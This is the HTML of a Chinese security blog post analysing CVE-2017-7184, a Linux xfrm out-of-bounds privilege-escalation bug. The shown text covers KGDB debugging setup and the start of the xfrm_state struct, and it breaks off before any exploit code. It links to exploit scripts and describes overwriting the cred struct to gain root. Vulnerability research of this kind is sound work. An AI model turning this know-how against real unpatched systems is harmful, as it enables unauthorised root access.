<!DOCTYPE html>
<html lang="zh-Hans">
<head>

    <!--[if lt IE 9]>
        <style>body {display: none; background: none !important} </style>
        <meta http-equiv="Refresh" Content="0; url=//outdatedbrowser.com/" />
    <![endif]-->

<meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge, chrome=1" />
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
<meta name="format-detection" content="telephone=no" />
<meta name="author" content="P4nda" />



<meta name="description" content="漏洞来源于长亭安全研究实验室在2017年PWN2OWN大赛中Ubuntu 16.10 Desktop的本地提权漏洞，本分析是该漏洞利用的一种直接越界写cred结构体进而提权的方法，后续可能会分析长亭文档中提及的劫持控制流的方法。">
<meta name="keywords" content="PWN,KERNEL,VULNERABILITY">
<meta property="og:type" content="article">
<meta property="og:title" content="Linux xfrm模块越界读写提权漏洞分析（CVE-2017-7184）">
<meta property="og:url" content="http://p4nda.top/2019/02/16/CVE-2017-7184/index.html">
<meta property="og:site_name" content="p4nda&#39;s blog">
<meta property="og:description" content="漏洞来源于长亭安全研究实验室在2017年PWN2OWN大赛中Ubuntu 16.10 Desktop的本地提权漏洞，本分析是该漏洞利用的一种直接越界写cred结构体进而提权的方法，后续可能会分析长亭文档中提及的劫持控制流的方法。">
<meta property="og:locale" content="zh-Hans">
<meta property="og:image" content="https://wx1.sinaimg.cn/mw690/d9e4cccely1g08cr63vyoj20kp0jxwf3.jpg">
<meta property="og:image" content="https://wx2.sinaimg.cn/mw690/d9e4cccely1g08crm4y72j20kp0jxt9a.jpg">
<meta property="og:image" content="https://ws4.sinaimg.cn/mw690/d9e4cccely1g08d59bb1sj20i00drgli.jpg">
<meta property="og:image" content="https://ws1.sinaimg.cn/mw690/d9e4cccely1g08d6t6z3fj20lh04dt8i.jpg">
<meta property="og:image" content="https://wx2.sinaimg.cn/mw690/d9e4cccely1g08d88sb32j20vs0lfjwr.jpg">
<meta property="og:image" content="https://wx2.sinaimg.cn/large/d9e4cccely1g099iiczvgj20yt0mgwl5.jpg">
<meta property="og:image" content="https://ws2.sinaimg.cn/large/d9e4cccely1g09aint3orj20qq0mzadz.jpg">
<meta property="og:image" content="https://wx2.sinaimg.cn/large/d9e4cccely1g09bwjx91qj20q90jftaz.jpg">
<meta property="og:image" content="https://wx1.sinaimg.cn/large/d9e4cccely1g08bt2smtmj21b70pwwvx.jpg">
<meta property="og:updated_time" content="2019-04-23T01:45:03.323Z">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="Linux xfrm模块越界读写提权漏洞分析（CVE-2017-7184）">
<meta name="twitter:description" content="漏洞来源于长亭安全研究实验室在2017年PWN2OWN大赛中Ubuntu 16.10 Desktop的本地提权漏洞，本分析是该漏洞利用的一种直接越界写cred结构体进而提权的方法，后续可能会分析长亭文档中提及的劫持控制流的方法。">
<meta name="twitter:image" content="https://wx1.sinaimg.cn/mw690/d9e4cccely1g08cr63vyoj20kp0jxwf3.jpg">
<link rel="stylesheet" href="/live2d/css/live2d.css" />
<link rel="apple-touch-icon" href= "/apple-touch-icon.png">


    <link rel="alternate" href="/atom.xml" title="p4nda&#39;s blog" type="application/atom+xml">



    <link rel="shortcut icon" href="/img/p4nda.jpeg">



    <link href="//cdn.bootcss.com/animate.css/3.5.1/animate.min.css" rel="stylesheet">



    <link href="//cdn.bootcss.com/fancybox/2.1.5/jquery.fancybox.min.css" rel="stylesheet">



    <script src="//cdn.bootcss.com/pace/1.0.2/pace.min.js"></script>
    <link href="//cdn.bootcss.com/pace/1.0.2/themes/blue/pace-theme-minimal.css" rel="stylesheet">


<link rel="stylesheet" href="/css/style.css">



<link href="//cdn.bootcss.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet">


<title>Linux xfrm模块越界读写提权漏洞分析（CVE-2017-7184） | p4nda&#39;s blog</title>

<script src="//cdn.bootcss.com/jquery/2.2.4/jquery.min.js"></script>
<script src="//cdn.bootcss.com/clipboard.js/1.5.10/clipboard.min.js"></script>

<script>
    var yiliaConfig = {
        fancybox: true,
        animate: true,
        isHome: false,
        isPost: true,
        isArchive: false,
        isTag: false,
        isCategory: false,
        fancybox_js: "//cdn.bootcss.com/fancybox/2.1.5/jquery.fancybox.min.js",
        scrollreveal: "//cdn.bootcss.com/scrollReveal.js/3.1.4/scrollreveal.min.js",
        search: true
    }
</script>


    <script>
        yiliaConfig.jquery_ui = [true, "//cdn.bootcss.com/jqueryui/1.10.4/jquery-ui.min.js", "//cdn.bootcss.com/jqueryui/1.10.4/css/jquery-ui.min.css"];
    </script>



    <script> yiliaConfig.rootUrl = "\/";</script>





    <script>
        var _hmt = _hmt || [];
        (function() {
            var hm = document.createElement("script");
            hm.src = "//hm.baidu.com/hm.js?11859a78d84a58f3a5bac3d2ec5ea89e";
            var s = document.getElementsByTagName("script")[0]; 
            s.parentNode.insertBefore(hm, s);
        })();
    </script>


</head>
<body>
  <div id="container">
    <div class="left-col">
    <div class="overlay"></div>
<div class="intrude-less">
    <header id="header" class="inner">
        <a href="/" class="profilepic">
            <img src="/img/p4nda.jpeg" class="animated zoomIn">
        </a>
        <hgroup>
          <h1 class="header-author"><a href="/">P4nda</a></h1>
        </hgroup>

        

        
            <form id="search-form">
            <input type="text" id="local-search-input" name="q" placeholder="search..." class="search form-control" autocomplete="off" autocorrect="off" searchonload="false" />
            <i class="fa fa-times" onclick="resetSearch()"></i>
            </form>
            <div id="local-search-result"></div>
            <p class='no-result'>No results found <i class='fa fa-spinner fa-pulse'></i></p>
        


        
            <div id="switch-btn" class="switch-btn">
                <div class="icon">
                    <div class="icon-ctn">
                        <div class="icon-wrap icon-house" data-idx="0">
                            <div class="birdhouse"></div>
                            <div class="birdhouse_holes"></div>
                        </div>
                        <div class="icon-wrap icon-ribbon hide" data-idx="1">
                            <div class="ribbon"></div>
                        </div>
                        
                        <div class="icon-wrap icon-link hide" data-idx="2">
                            <div class="loopback_l"></div>
                            <div class="loopback_r"></div>
                        </div>
                        
                        
                        <div class="icon-wrap icon-me hide" data-idx="3">
                            <div class="user"></div>
                            <div class="shoulder"></div>
                        </div>
                        
                    </div>
                    
                </div>
                <div class="tips-box hide">
                    <div class="tips-arrow"></div>
                    <ul class="tips-inner">
                        <li>菜单</li>
                        <li>标签</li>
                        
                        <li>友情链接</li>
                        
                        
                        <li>关于我</li>
                        
                    </ul>
                </div>
            </div>
        

        <div id="switch-area" class="switch-area">
            <div class="switch-wrap">
                <section class="switch-part switch-part1">
                    <nav class="header-menu">
                        <ul>
                        
                            <li><a href="/">主页</a></li>
                        
                            <li><a href="/archives/">所有文章</a></li>
                        
                            <li><a href="/tags/">标签云</a></li>
                        
                            <li><a href="/about/">关于我</a></li>
                        
                        </ul>
                    </nav>
                    <nav class="header-nav">
                        <ul class="social">
                            
                                <a class="fa Email" href="mailto:p4nda0223@gmail.com" title="Email"></a>
                            
                                <a class="fa GitHub" href="https://github.com/ret2p4nda" title="GitHub"></a>
                            
                                <a class="fa RSS" href="/atom.xml" title="RSS"></a>
                            
                                <a class="fa 博客园" href="http://www.cnblogs.com/p4nda/" title="博客园"></a>
                            
                                <a class="fa Twitter" href="https://twitter.com/P4nda20371774" title="Twitter"></a>
                            
                                <a class="fa QQ" href="tencent://message/?uin=381124487&Site=junichi&Menu=yes" title="QQ"></a>
                            
                        </ul>
                    </nav>
                </section>
                
                
                <section class="switch-part switch-part2">
                    <div class="widget tagcloud" id="js-tagcloud">
                        <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/BROWSER/">BROWSER</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/CTF/">CTF</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/KERNEL/">KERNEL</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Linux/">Linux</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/PWN/">PWN</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/PWNABLE-TW/">PWNABLE.TW</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Questions/">Questions</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/VULNERABILITY/">VULNERABILITY</a></li></ul>
                    </div>
                </section>
                
                
                
                <section class="switch-part switch-part3">
                    <div id="js-friends">
                    
                      <a class="main-nav-link switch-friends-link" href="http://0gur1.cc">0gur1</a>
                    
                      <a class="main-nav-link switch-friends-link" href="https://tac1t0rnx.space/">Tac1t0rnX</a>
                    
                      <a class="main-nav-link switch-friends-link" href="https://veritas501.space/">Veritas501</a>
                    
                      <a class="main-nav-link switch-friends-link" href="https://p1umer.github.io/">p1umer</a>
                    
                      <a class="main-nav-link switch-friends-link" href="https://blog.aisissel.cn/">Sissel</a>
                    
                      <a class="main-nav-link switch-friends-link" href="//p4nda.top/WooyunDrops/">Wooyun知识库</a>
                    
                    </div>
                </section>
                

                
                
                <section class="switch-part switch-part4">
                
                    <div id="js-aboutme">PWNer of Dubhe | PWN &amp; security | byr</div>
                </section>
                
            </div>
        </div>
    </header>                
</div>
    </div>
    <div class="mid-col">
      <nav id="mobile-nav">
      <div class="overlay">
          <div class="slider-trigger"></div>
          <h1 class="header-author js-mobile-header hide"><a href="/" title="回到主页">P4nda</a></h1>
      </div>
    <div class="intrude-less">
        <header id="header" class="inner">
            <a href="/" class="profilepic">
                <img src="/img/p4nda.jpeg" class="animated zoomIn">
            </a>
            <hgroup>
              <h1 class="header-author"><a href="/" title="回到主页">P4nda</a></h1>
            </hgroup>
            
            <nav class="header-menu">
                <ul>
                
                    <li><a href="/">主页</a></li>
                
                    <li><a href="/archives/">所有文章</a></li>
                
                    <li><a href="/tags/">标签云</a></li>
                
                    <li><a href="/about/">关于我</a></li>
                
                <div class="clearfix"></div>
                </ul>
            </nav>
            <nav class="header-nav">
                        <ul class="social">
                            
                                <a class="fa Email" target="_blank" href="mailto:p4nda0223@gmail.com" title="Email"></a>
                            
                                <a class="fa GitHub" target="_blank" href="https://github.com/ret2p4nda" title="GitHub"></a>
                            
                                <a class="fa RSS" target="_blank" href="/atom.xml" title="RSS"></a>
                            
                                <a class="fa 博客园" target="_blank" href="http://www.cnblogs.com/p4nda/" title="博客园"></a>
                            
                                <a class="fa Twitter" target="_blank" href="https://twitter.com/P4nda20371774" title="Twitter"></a>
                            
                                <a class="fa QQ" target="_blank" href="tencent://message/?uin=381124487&Site=junichi&Menu=yes" title="QQ"></a>
                            
                        </ul>
            </nav>
        </header>                
    </div>
    <link class="menu-list" tags="标签" friends="友情链接" about="关于我"/>
</nav>
      <div class="body-wrap"><article id="post-CVE-2017-7184" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2019/02/16/CVE-2017-7184/" class="article-date">
      <time datetime="2019-02-16T07:36:55.000Z" itemprop="datePublished">2019-02-16</time>
</a>


    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 class="article-title" itemprop="name">
      Linux xfrm模块越界读写提权漏洞分析（CVE-2017-7184）
    </h1>
  

      </header>
      
      <div class="article-info article-info-post">
        

        
    <div class="article-tag tagcloud">
        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/KERNEL/">KERNEL</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/PWN/">PWN</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/VULNERABILITY/">VULNERABILITY</a></li></ul>
    </div>

        <div class="clearfix"></div>
      </div>
      
    
    <div class="article-entry" itemprop="articleBody">
      
          
        <p>本次漏洞分析基于<code>Linux 4.4.0-21-generic</code>版本，即<code>Ubuntu 16.04.1</code>。镜像可从<a href="http://old-releases.ubuntu.com/releases/16.04.1/ubuntu-16.04-desktop-amd64.iso" target="_blank" rel="noopener">此处</a>下载，文中涉及的脚本可从<a href="https://github.com/ret2p4nda/kernel-pwn/blob/master/CVE-2017-7184" target="_blank" rel="noopener">此处</a>下载。</p>
<p>本文的先知链接：<a href="https://xz.aliyun.com/t/4133" target="_blank" rel="noopener">https://xz.aliyun.com/t/4133</a></p>
<h1 id="双机调试环境搭建"><a href="#双机调试环境搭建" class="headerlink" title="双机调试环境搭建"></a>双机调试环境搭建</h1><p>本次分析没有采用<code>QEMU</code>，而是用了<code>VMware</code>来进行双机调试，给我个人的感觉就是很慢，而且符号表不全很多函数都被编译优化掉了。调试环境构建参考了<a href="https://bbs.pediy.com/thread-249192.htm" target="_blank" rel="noopener">《ubuntu 内核源码调试方法（双机调试》</a>，由于我已经有了一个调试虚拟机（debugging），所以仅需利用上述镜像构建被调试机（debuggee）。</p>
<h2 id="debugging环境配置"><a href="#debugging环境配置" class="headerlink" title="debugging环境配置"></a>debugging环境配置</h2><p>由于主要的调试时在<code>debugging</code>上完成的，所以大部分的程序包都需要安装在debugging上。</p>
<p><strong>dbsym安装</strong></p>
<p>这个就是带有符号表的vmlinux文件，需要根据debuggee来确定。</p>
<p>如在<code>debuggee</code>上利用<code>uname -sr</code>命令得到的结果是<code>Linux 4.4.0-21-generic</code>，则需要下载安装<code>vmlinux-4.4.0-21-generic</code>。</p>
<p>首先需要更新源文件，执行命令如下：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 增加source.list</span></span><br><span class="line">codename=$(lsb_release -c | awk <span class="string">'&#123;print $2&#125;'</span>)</span><br><span class="line">sudo tee /etc/apt/sources.list.d/ddebs.list &lt;&lt; EOF</span><br><span class="line">deb http://ddebs.ubuntu.com/ <span class="variable">$&#123;codename&#125;</span> main restricted universe multiverse</span><br><span class="line">deb http://ddebs.ubuntu.com/ <span class="variable">$&#123;codename&#125;</span>-security main restricted universe multiverse</span><br><span class="line">deb http://ddebs.ubuntu.com/ <span class="variable">$&#123;codename&#125;</span>-updates main restricted universe multiverse</span><br><span class="line">deb http://ddebs.ubuntu.com/ <span class="variable">$&#123;codename&#125;</span>-proposed main restricted universe multiverse</span><br><span class="line">EOF</span><br><span class="line"><span class="comment"># 添加访问符号服务器的秘钥文件</span></span><br><span class="line">wget -O - http://ddebs.ubuntu.com/dbgsym-release-key.asc | sudo apt-key add -</span><br><span class="line"><span class="comment"># 更新源文件</span></span><br><span class="line">sudo apt-get update</span><br></pre></td></tr></table></figure>
<p>然后利用apt-get下载这个文件：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install linux-image-4.4.0-21-generic-dbgsym</span><br></pre></td></tr></table></figure>
<p>然后进入漫长的等待，最终在<code>/usr/lib/debug/boot/vmlinux-4.4.0-21-generic</code>这里可以找到。</p>
<p><strong>源码下载与配置</strong></p>
<p>我采用了比较粗暴的方法，直接下载<code>linux 4.4.0</code>版本的源码，命令如下：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 启用deb-src</span></span><br><span class="line">deb-src http://cn.archive.ubuntu.com/ubuntu/ xenial main restricted</span><br><span class="line"><span class="comment">#搜索源码：</span></span><br><span class="line">apt-cache search linux-source</span><br><span class="line"><span class="comment">#安装指定版本的源码：</span></span><br><span class="line">sudo apt-get install linux-source-4.4.0</span><br></pre></td></tr></table></figure>
<p>默认下载的源码会放在<code>/usr/src/linux-source-4.4.0/linux-source-4.4.0.tar.bz2</code>。并将其解压到<code>/build/linux-Ay7j_C/linux-4.4.0</code>目录下就可以在调试的时候看到源码。原因是调试符号中包含的路径是编译时的硬编码路径，因此其他Ubuntu版本在调试时可找到这个硬编码路径，将源码解压到此处即可。</p>
<p><strong>设置通信串口</strong></p>
<p>需要为<code>debugging</code>添加通信的串口，其调试原理是两虚拟机通过物理实体机的串口进行通信，远程调试。</p>
<p>对<code>debugging</code>的设置如下，命名管道如果<strong>物理机</strong>是<code>Windows</code>系统，则为<code>//./pipe/com_1</code>。<code>Linux</code>系统为<code>/tmp/serial</code>。由于存在打印机设备可能占用<code>/dev/ttyS0设备</code>，因此在<code>debugging</code>和<code>debuggee</code>中，我均删除了这个硬件。</p>
<p><img src="https://wx1.sinaimg.cn/mw690/d9e4cccely1g08cr63vyoj20kp0jxwf3.jpg" alt="debugging"></p>
<p><strong>编写调试脚本</strong></p>
<p>调试脚本即<code>gdb</code>所执行的命令，用于远程调试<code>debuggee</code>。此脚本需要<code>sudo</code>执行。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">gdb \</span><br><span class="line">    -ex <span class="string">"add-auto-load-safe-path <span class="variable">$(pwd)</span>"</span> \</span><br><span class="line">    -ex <span class="string">"file /usr/lib/debug/boot/vmlinux-4.4.0-21-generic"</span> \</span><br><span class="line">    -ex <span class="string">'set arch i386:x86-64:intel'</span> \</span><br><span class="line">    -ex <span class="string">'target remote /dev/ttyS0'</span> \</span><br><span class="line">    -ex <span class="string">'continue'</span> \</span><br><span class="line">    -ex <span class="string">'disconnect'</span> \</span><br><span class="line">    -ex <span class="string">'set arch i386:x86-64'</span> \</span><br><span class="line">    -ex <span class="string">'target remote /dev/ttyS0'</span></span><br></pre></td></tr></table></figure>
<h2 id="debuggee环境配置"><a href="#debuggee环境配置" class="headerlink" title="debuggee环境配置"></a>debuggee环境配置</h2><p><strong>启动项设置</strong></p>
<p>首先需要在为待调试的内核设置一个新的启动项，使其开机时进入调试模式，等待链接。</p>
<p>具体操作是编辑<code>/etc/grub.d/40_custom</code>，在其中加入</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line"><span class="built_in">exec</span> tail -n +3 <span class="variable">$0</span></span><br><span class="line"><span class="comment"># This file provides an easy way to add custom menu entries.  Simply type the</span></span><br><span class="line"><span class="comment"># menu entries you want to add after this comment.  Be careful not to change</span></span><br><span class="line"><span class="comment"># the 'exec tail' line above.</span></span><br><span class="line">menuentry <span class="string">'Ubuntu, KGDB with nokaslr'</span> --class ubuntu --class gnu-linux --class gnu --class os <span class="variable">$menuentry_id_option</span> <span class="string">'gnulinux-simple-b5907b23-09bb-4b75-bd51-eb04048e56d8'</span> &#123;</span><br><span class="line">	recordfail</span><br><span class="line">	load_video</span><br><span class="line">	gfxmode <span class="variable">$linux_gfx_mode</span></span><br><span class="line">	insmod gzio</span><br><span class="line">	<span class="keyword">if</span> [ x<span class="variable">$grub_platform</span> = xxen ]; <span class="keyword">then</span> insmod xzio; insmod lzopio; <span class="keyword">fi</span></span><br><span class="line">	insmod part_msdos</span><br><span class="line">	insmod ext2</span><br><span class="line">	<span class="built_in">set</span> root=<span class="string">'hd0,msdos1'</span></span><br><span class="line">	<span class="keyword">if</span> [ x<span class="variable">$feature_platform_search_hint</span> = xy ]; <span class="keyword">then</span></span><br><span class="line">	  search --no-floppy --fs-uuid --<span class="built_in">set</span>=root --hint-bios=hd0,msdos1 --hint-efi=hd0,msdos1 --hint-baremetal=ahci0,msdos1  b5907b23-09bb-4b75-bd51-eb04048e56d8</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">	  search --no-floppy --fs-uuid --<span class="built_in">set</span>=root b5907b23-09bb-4b75-bd51-eb04048e56d8</span><br><span class="line">	<span class="keyword">fi</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">'Loading Linux 4.10.0-19 with KGDB built by GEDU lab...'</span>	</span><br><span class="line">	linux	/boot/vmlinuz-4.4.0-21-generic root=UUID=b5907b23-09bb-4b75-bd51-eb04048e56d8 ro find_preseed=/preseed.cfg auto noprompt priority=critical locale=en_US quiet kgdbwait kgdb8250=io,03f8,ttyS0,115200,4 kgdboc=ttyS0,115200 kgdbcon nokaslr</span><br><span class="line">    <span class="built_in">echo</span> <span class="string">'Loading initial ramdisk ...'</span>	</span><br><span class="line">	initrd	/boot/initrd.img-4.4.0-21-generic</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>其中参数可参考<code>/boot/grub/grub.cfg</code>文件，修改完成后执行<code>sudo update-grub</code>命令。</p>
<p><strong>设置通信串口</strong></p>
<p><code>debuggee</code>通信串口的设置与 <code>debugging</code>设置类似，区别仅在于<code>debugging</code>是服务器，<code>debuggee</code>是客户机。</p>
<hr>
<p><img src="https://wx2.sinaimg.cn/mw690/d9e4cccely1g08crm4y72j20kp0jxt9a.jpg" alt="debuggee"></p>
<h2 id="进入调试"><a href="#进入调试" class="headerlink" title="进入调试"></a>进入调试</h2><p>在<code>debugging</code>启动时，按住<code>shift</code>，出现如下界面，选择<code>KGDB with nokaslr</code>。</p>
<p><img src="https://ws4.sinaimg.cn/mw690/d9e4cccely1g08d59bb1sj20i00drgli.jpg" alt=""></p>
<p>系统进入远程调试等待。</p>
<p><img src="https://ws1.sinaimg.cn/mw690/d9e4cccely1g08d6t6z3fj20lh04dt8i.jpg" alt=""></p>
<p>此时，在<code>debugging</code>中执行<code>sudo ./gdb_kernel</code>，就可以远程调试了。</p>
<p><img src="https://wx2.sinaimg.cn/mw690/d9e4cccely1g08d88sb32j20vs0lfjwr.jpg" alt=""></p>
<h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><p>漏洞位于内核<code>xfrm</code>模块，该模块是<code>IPSEC</code>协议的实现模块。其中<code>xfrm_state</code>结构体用于表示一个<code>SA(Security Associstion)</code>，<code>AH</code>及<code>ESP</code>协议数据包可通过<code>SA</code>进行检查，其数据结构如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">xfrm_state</span> &#123;</span></span><br><span class="line">	<span class="keyword">possible_net_t</span>		xs_net;</span><br><span class="line">	<span class="keyword">union</span> &#123;</span><br><span class="line">		<span class="class"><span class="keyword">struct</span> <span class="title">hlist_node</span>	<span class="title">gclist</span>;</span></span><br><span class="line">		<span class="class"><span class="keyword">struct</span> <span class="title">hlist_node</span>	<span class="title">bydst</span>;</span></span><br><span class="line">	&#125;;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">hlist_node</span>	<span class="title">bysrc</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">hlist_node</span>	<span class="title">byspi</span>;</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">atomic_t</span>		refcnt;</span><br><span class="line">	<span class="keyword">spinlock_t</span>		lock;</span><br><span class="line"></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">xfrm_id</span>		<span class="title">id</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">xfrm_selector</span>	<span class="title">sel</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">xfrm_mark</span>	<span class="title">mark</span>;</span></span><br><span class="line">	u32			tfcpad;</span><br><span class="line"></span><br><span class="line">	u32			genid;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Key manager bits */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">xfrm_state_walk</span>	<span class="title">km</span>;</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Parameters of this state. */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">		u32		reqid;</span><br><span class="line">		u8		mode;</span><br><span class="line">		u8		replay_window;</span><br><span class="line">		u8		aalgo, ealgo, calgo;</span><br><span class="line">		u8		flags;</span><br><span class="line">		u16		family;</span><br><span class="line">		<span class="keyword">xfrm_address_t</span>	saddr;</span><br><span class="line">		<span class="keyword">int</span>		header_len;</span><br><span class="line">		<span class="keyword">int</span>		trailer_len;</span><br><span class="line">		u32		extra_flags;</span><br><span class="line">	&#125; props;</span><br><span class="line"></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">xfrm_lifetime_cfg</span> <span class="title">lft</span>;</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Data for transformer */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">xfrm_algo_auth</span>	*<span class="title">aalg</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">xfrm_algo</span>	*<span class="title">ealg</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">xfrm_algo</span>	*<span class="title">calg</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">xfrm_algo_aead</span>	*<span class="title">aead</span>;</span></span><br><span class="line">	<span class="keyword">const</span> <span class="keyword">char</span>		*geniv;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Data for encapsulator */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">xfrm_encap_tmpl</span>	*<span class="title">encap</span>;</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Data for care-of address */</span></span><br><span class="line">	<span class="keyword">xfrm_address_t</span>	*coaddr;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* IPComp needs an IPIP tunnel for handling uncompressed packets */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">xfrm_state</span>	*<span class="title">tunnel</span>;</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">/* If a tunnel, number of users + 1 */</span></span><br><span class="line">	<span class="keyword">atomic_t</span>		tunnel_users;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* State for replay detection */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">xfrm_replay_state</span> <span class="title">replay</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">xfrm_replay_state_esn</span> *<span class="title">replay_esn</span>;</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Replay detection state at the time we sent the last notification */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">xfrm_replay_state</span> <span class="title">preplay</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">xfrm_replay_state_esn</span> *<span class="title">preplay_esn</span>;</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">/* The functions for replay detection. */</span></span><br><span class="line">	<span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">xfrm_replay</span> *<span class="title">repl</span>;</span></span><br><span class="line"></span><br><span class="line">	<span 